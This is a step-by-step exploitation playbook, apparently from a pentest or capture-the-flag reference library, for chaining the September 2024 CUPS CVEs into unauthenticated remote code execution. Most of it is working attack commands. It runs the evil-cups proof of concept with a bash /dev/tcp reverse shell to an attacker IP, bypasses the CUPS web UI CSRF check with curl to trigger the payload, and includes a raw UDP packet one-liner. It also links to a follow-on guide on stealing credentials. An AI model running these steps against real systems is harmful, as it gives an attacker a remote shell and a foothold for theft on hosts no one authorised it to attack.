# CUPS / cups-browsed → unauthenticated RCE (CVE-2024-47176 chain)

## When this applies

- Target exposes **UDP/631** (cups-browsed) **or** TCP/631 (CUPS web UI) with default config.
- `Server: CUPS/2.4 IPP/2.1` banner; web title `<title>... - CUPS X.Y.Z</title>` reveals exact version.
- Vulnerable cups-browsed accepts browse packets from any source — pre-fix versions of `cups-browsed`, `cups-filters`, `libppd`, `libcupsfilters`.

## CVE chain

The attack uses **all four** September-2024 CUPS CVEs together:

| CVE | Component | Role in chain |
|-----|-----------|---------------|
| CVE-2024-47176 | cups-browsed | Listener binds INADDR_ANY:631; trusts attacker-supplied IPP URL |
| CVE-2024-47076 | libcupsfilters | No validation of attribute strings returned by remote IPP server |
| CVE-2024-47175 | libppd | Attacker-controlled attributes written verbatim into generated PPD |
| CVE-2024-47177 | cups-filters / foomatic-rip | `*FoomaticRIPCommandLine` PPD directive → arbitrary command exec when any document prints |

Combined effect: send one UDP packet → target registers a printer pointing at attacker's IPP server → attacker's `Get-Printer-Attributes` reply embeds a malicious PPD → when *any* user prints to that printer, foomatic-rip executes the embedded command as `lp`.

## Steps

```bash
# 1. Stand up a malicious IPP server (use ippsec/evil-cups POC).
git clone --depth 1 https://github.com/ippsec/evil-cups.git
cd evil-cups && python3 -m venv venv && . venv/bin/activate && pip install ippserver

# 2. Trigger registration. <ATTACKER_IP>=your VPN IP, <CMD>=reverse shell payload.
python evilcups.py <ATTACKER_IP> <TARGET_IP> 'bash -c "bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1"'

# 3. Confirm printer registered (~30-60s after UDP packet).
curl -s "http://<TARGET_IP>:631/printers" | grep -oE '/printers/[A-Za-z0-9_-]+'
# Expect: legit printer + new HACKED_<dotted_attacker_ip> entry

# 4. Trigger print job — see "Web UI CSRF bypass" below; lp -h does NOT work.
```

## Web UI CSRF bypass — required to fire the printer

CUPS rejects `OP=print-test-page` POSTs unless **all three** are present:

1. Cookie `org.cups.sid=<sid>` (issued by any GET to /).
2. Form field `org.cups.sid` matching the cookie value.
3. `Referer: http://<TARGET_IP>:631/printers/<PRINTER_NAME>` matching the action URL.

Otherwise the POST returns HTTP 200 silently with no job queued.

```bash
# Establish session + extract sid
COOKIE=/tmp/cups.cookies
curl -s -c "$COOKIE" "http://<TARGET_IP>:631/" -o /dev/null
SID=$(awk '/org.cups.sid/{print $NF}' "$COOKIE" | head -1)

# Read the printer page (renews cookie, gives form sid)
curl -s -b "$COOKIE" -c "$COOKIE" "http://<TARGET_IP>:631/printers/<PRINTER_NAME>" -o /dev/null

# Fire print-test-page — payload runs as `lp`
curl -s -b "$COOKIE" -c "$COOKIE" \
  -H "Referer: http://<TARGET_IP>:631/printers/<PRINTER_NAME>" \
  --data-urlencode "OP=print-test-page" \
  --data-urlencode "org.cups.sid=$SID" \
  "http://<TARGET_IP>:631/printers/<PRINTER_NAME>"
# Body should contain: "Test page sent; job ID is ..."
```

## Common pitfalls

- **`lp -h <TARGET_IP> -d <PRINTER> file.txt` returns "printer or class is not shared"** even when the same printer accepts test-page POSTs over HTTP. The CUPS `Shared No` directive blocks the IPP path but not the web maintenance endpoint. Always trigger via the web UI for unauthenticated exploitation.
- **Browse packet may not arrive** if attacker host is behind NAT or the IPP-server port is firewalled. Bind explicitly to the VPN-tunnel IP, not 0.0.0.0, and confirm `lsof -i :12345` shows LISTEN before sending.
- **Initial UDP packet sometimes ignored** — re-send manually with raw socket if the IPP server doesn't see an inbound TCP connect within ~60s:
  `python3 -c "import socket;s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM);s.sendto(b'2 3 http://<ATTACKER_IP>:12345/printers/EVILCUPS \"x\" \"x\" \"x\" \n',('<TARGET_IP>',631))"`
- **Bash history-expansion eats `!`** in passwords or payloads. Run `set +H` and use single quotes for any command containing `!`.

## Verifying success

- Reverse shell connects back as user `lp` (uid=7).
- `id` shows `uid=7(lp) gid=7(lp) groups=7(lp)`.
- After foothold, see [`scenarios/linux-privesc/credential-files-hunt.md`](../../../../system/reference/scenarios/linux-privesc/credential-files-hunt.md) for print-spool credential exfil.

## Tools

- ippsec/evil-cups (Python POC) — minimal IPP server with FoomaticRIP payload
- curl + cookie jar — web-UI CSRF dance
- python3 socket — manual UDP browse-packet retransmit
